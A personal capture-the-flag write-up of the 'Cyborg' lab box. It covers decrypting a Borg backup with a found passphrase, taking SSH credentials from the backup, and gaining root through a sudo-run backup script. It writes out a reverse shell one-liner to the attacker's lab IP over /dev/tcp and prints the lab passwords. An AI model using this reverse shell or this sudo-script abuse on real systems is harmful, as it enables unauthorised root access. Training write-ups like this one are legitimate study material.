# Cyborg Writeup

Name: Cyborg
Date:  21/5/2024
Difficulty:  Easy
Goals:  
- someone OSCP like list
Learnt:
- Jugular requires both sides of a jaw - 2 pieces, one direction, one focus; lacking the password on the web page... 
Beyond Root:
- Read a blog about the implementation of Borg 


- [[Cyborg-Notes.md]]
- [[Cyborg-CMD-by-CMDs.md]]

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

Admin pages
![1080](adminpage.png)
I missed the /etc/ directory and went for the jugular

Found the archive.tar, which in hindsight I went straight for 
![](archivehostedonadmin.png)

Get get...
![](inthesource.png)

Analysis begins without a password
![](usernamefield.png)

Learning to Borg
![](readmeborgbackupreadthedocsio.png)

Dorking the Borg like I am prepare
![](itsiarealborg.png)
> [Borg](https://borgbackup.readthedocs.io/en/stable/) *"BorgBackup (short: Borg) is a deduplicating backup program. Optionally, it supports compression and authenticated encryption. The main goal of Borg is to provide an efficient and secure way to backup data. The data deduplication technique used makes Borg suitable for daily backups since only changes are stored. The authenticated encryption technique makes it suitable for backups to not fully trusted targets. See the [installation manual](https://borgbackup.readthedocs.org/en/stable/installation.html) or, if you have already downloaded Borg, `docs/installation.rst` to get started with Borg. There is also an [offline documentation](https://readthedocs.org/projects/borgbackup/downloads) available, in multiple formats."

Going through this initially by just getting a understanding of the data of the files in the archive.tar I had the ominous feeling as the keys, hashing algorithms and the notion that the only way is SSH that this box could be a nasty rabbit hole down cryptography way... My misgivings are probably due to my experience with Cryptographic rooms and more puzzle-y boxes on THM and the [[Hawk-Helped-Through]]. After RTFM what the Borg utility was. I can now at least not fret to much about the combinatoric nightmare of hoarding data and then trying combinations. [Divide and Conqueror, unlike the Star Trek Borg and probably more like the Q...](https://www.youtube.com/watch?v=UolX8swBJHc) 


![](hints5.png)

 config
```
[repository]
version = 1
segments_per_dir = 1000
max_segment_size = 524288000
append_only = 0
storage_quota = 0
additional_free_space = 0
id = ebb1973fa0114d4ff34180d1e116c913d73ad1968bf375babd0259f74b848d31
key = hqlhbGdvcml0aG2mc2hhMjU2pGRhdGHaAZ6ZS3pOjzX7NiYkZMTEyECo+6f9mTsiO9ZWFV
	L/2KvB2UL9wHUa9nVV55aAMhyYRarsQWQZwjqhT0MedUEGWP+FQXlFJiCpm4n3myNgHWKj
	2/y/khvv50yC3gFIdgoEXY5RxVCXhZBtROCwthh6sc3m4Z6VsebTxY6xYOIp582HrINXzN
	8NZWZ0cQZCFxwkT1AOENIljk/8gryggZl6HaNq+kPxjP8Muz/hm39ZQgkO0Dc7D3YVwLhX
	daw9tQWil480pG5d6PHiL1yGdRn8+KUca82qhutWmoW1nyupSJxPDnSFY+/4u5UaoenPgx
	oDLeJ7BBxUVsP1t25NUxMWCfmFakNlmLlYVUVwE+60y84QUmG+ufo5arj+JhMYptMK2lyN
	eyUMQWcKX0fqUjC+m1qncyOs98q5VmTeUwYU6A7swuegzMxl9iqZ1YpRtNhuS4A5z9H0mb
	T8puAPzLDC1G33npkBeIFYIrzwDBgXvCUqRHY6+PCxlngzz/QZyVvRMvQjp4KC0Focrkwl
	vi3rft2Mh/m7mUdmEejnKc5vRNCkaGFzaNoAICDoAxLOsEXy6xetV9yq+BzKRersnWC16h
	SuQq4smlLgqml0ZXJhdGlvbnPOAAGGoKRzYWx02gAgzFQioCyKKfXqR5j3WKqwp+RM0Zld
	UCH8bjZLfc1GFsundmVyc2lvbgE=


```


https://borgbackup.readthedocs.io
![](borgconfig.png)

`strings index.5`

```
BORG_IDXd
%J_I
FDB9
DIy?
s~16*
(_$i
|C*c
vN&W
|)RK
TzJ?
p2ky
.	e;
O@n;_
^rVm
.W3^
K0`L
Q+;,
	f&nHS.
ihQL1
 y@-
TOT[M$9
_nj0
we"b
r!gT
jN:&
t-@ A
!nWSx
[D.m
R6V@
!_}~
|Yr.
)	y0V>
E2^d
vTtg
I o1A
OUWT
-4o~W6
+sA9
pUak
v~iV
i8ML
uF7Jw;
>7g&
	I6Bg
q|NF
_,]6
`v/(D~

```

due dilegence at a depth that looks like busy work, but I have found is so important for some HTB machines...
```json
versionhints@{"algorithm": "XXH64", "digests": {"final": "05178884e81563d7"}}indexb{"algorithm": "XXH64", "digests": {"HashHeader": "146e9cb969e480a3", "final": "b53737af67235823"}}

```

nonce for cyrptography 
```
00000000200000b9
```


https://github.com/Cyan4973/xxHash

![](cyberchefingthekey.png)

...
![](ippsecsizecheckingttheid.png)


more ...
```bash
echo 'hqlhbGdvcml0aG2mc2hhMjU2pGRhdGHaAZ6ZS3pOjzX7NiYkZMTEyECo+6f9mTsiO9ZWFV
        L/2KvB2UL9wHUa9nVV55aAMhyYRarsQWQZwjqhT0MedUEGWP+FQXlFJiCpm4n3myNgHWKj
        2/y/khvv50yC3gFIdgoEXY5RxVCXhZBtROCwthh6sc3m4Z6VsebTxY6xYOIp582HrINXzN
        8NZWZ0cQZCFxwkT1AOENIljk/8gryggZl6HaNq+kPxjP8Muz/hm39ZQgkO0Dc7D3YVwLhX
        daw9tQWil480pG5d6PHiL1yGdRn8+KUca82qhutWmoW1nyupSJxPDnSFY+/4u5UaoenPgx
        oDLeJ7BBxUVsP1t25NUxMWCfmFakNlmLlYVUVwE+60y84QUmG+ufo5arj+JhMYptMK2lyN
        eyUMQWcKX0fqUjC+m1qncyOs98q5VmTeUwYU6A7swuegzMxl9iqZ1YpRtNhuS4A5z9H0mb
        T8puAPzLDC1G33npkBeIFYIrzwDBgXvCUqRHY6+PCxlngzz/QZyVvRMvQjp4KC0Focrkwl
        vi3rft2Mh/m7mUdmEejnKc5vRNCkaGFzaNoAICDoAxLOsEXy6xetV9yq+BzKRersnWC16h
        SuQq4smlLgqml0ZXJhdGlvbnPOAAGGoKRzYWx02gAgzFQioCyKKfXqR5j3WKqwp+RM0Zld
        UCH8bjZLfc1GFsundmVyc2lvbgE='  | tr -d '\n' | sed 's/        //g' | base64 -d
```
![](decodingb64key.png)
...
![](datadirectory.png)

Testing on a VM 
```bash
apt install borgbackup
```

Usually -thm is enough. I removed the final ) to the markdown picture linking:
![](oopsonthedork.png)
Then as soon as I loaded this page up I did not read and instantly started editing the page... I did try at least. As this has been sitting in the to do pile and I have done at least 4 hours of playing around I just want to extract what I had learnt from this a move forward. Asked ChatGPT for  Firefox plugins for saved queries but all the responses did not exist. That is pretty easy PrivEsc to find anyway so its not that big of issue.

- Alex can run `/etc/mp3backups/backup.sh`

Operation Passwords should really die soon please..
![](passkeywhere.png)

![](backtothecredentials.png)

Feeling like the crab that thinks its won the under-the-sea-life-time-award-for-invertibrate-morons award...
![](duediligentsquid.png)

![](forthesquidconf.png)

And
![](thecredentialsarehere.png)

[I get to make the same joke in a week](https://www.youtube.com/watch?v=5JTZbGOG91Y)
![](SPOOGIEBOBBLEPART2.png)
Unfortunately no password reuse for alex or field ssh
```
squidward
```

After trying out what I am to actually extract
![](thefinalarchivefinalarg.png)

How to
https://github.com/borgbackup/borg/issues/4536
![](LIST.png)

Dirty extract the data you want from a Borg archive
```bash
# Get the name of archive to be extracted
borg list $ARCHIVE
# List the directory structure
borg extract --list $ARCHIVE::$name --stdout
# Extract a file to stdout to read 
borg extract $ARCHIVE::$path/file.txt --stdout
```

List the directory as so...
![](targetingacquiresecretsarenotsecrets.png)

![](aweful.png)
## Foothold

```
alex : S3cretP@s3
```

![](foothold.png)
## Privilege Escalation

Alex can run `/etc/mp3backups/backup.sh` was in a picture earlier - this does not disqualify me from claiming this to be a Writeup
![](nopasswdonthebackupasroot.png)

Looking in the /etc/mp3backups/ directory the lazy way
![](seeingwhatgetsbackedup.png)

Reading the script into ...
```bash
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
        case "${flag}" in
                c) command=${OPTARG};;
        esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```

Annotated for explainations as to privilege escalation
```bash
#!/bin/bash

# Add filenames with .mp3 extension - important because  
sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt

# When then perform a `read` from std C Library not a Linux Binary
input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

# The getopts utility shall retrieve options and option-arguments from a list of parameters.
while getopts c: flag
do
        case "${flag}" in
                c) command=${OPTARG};;
        esac
done

# Initialise a variable of filepaths 
backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```

https://man7.org/linux/man-pages/man2/read.2.html
https://man7.org/linux/man-pages/man1/getopts.1p.html

After reading I checked ownership of files, before paused regarding the directory
![](thisfilebelongstoalex.png)
```bash
chmod +w /etc/mp3backups/backup.sh
```
We can just add this and run with `sudo` to root the box
```bash
bash -c 'exec bash -i &>/dev/tcp/10.11.3.193/8443 <&1'
```

![](root.png)
## Post-Root-Reflection  

It's a puzzle are you missing potential pieces?
- do not bother with crypto-till-you-have-to, passwords can stored by idiots everywhere

Application Analysis
- Systems
	- What do I need to replicate the target!
		- PASSWORD

## Beyond Root

Read https://artemis.sh/2022/06/22/how-i-use-borg.html, for context during RFTM of `borgbackup`